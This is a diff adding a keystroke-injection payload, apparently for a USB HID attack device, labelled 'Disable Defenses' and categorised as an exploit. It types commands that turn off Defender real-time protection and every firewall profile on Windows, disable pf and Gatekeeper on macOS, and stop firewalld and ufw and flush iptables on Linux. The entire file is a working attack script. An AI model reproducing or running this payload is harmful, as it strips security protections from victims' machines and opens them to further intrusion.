@@ -1,0 +1,26 @@
+NAME Disable Defenses
+DESCRIPTION Disables AV/firewall (requires admin/root)
+CATEGORY exploit
+PLATFORMS WIN,MAC,LINUX
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass Start-Process powershell -Verb RunAs -ArgumentList '-nop -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Write-Host Defenses disabled"'
+ENTER
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+STRING sudo pfctl -d 2>/dev/null; sudo spctl --master-disable 2>/dev/null; echo Defenses disabled
+ENTER
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+STRING sudo systemctl stop firewalld 2>/dev/null; sudo ufw disable 2>/dev/null; sudo iptables -F 2>/dev/null; echo Defenses disabled
+ENTER
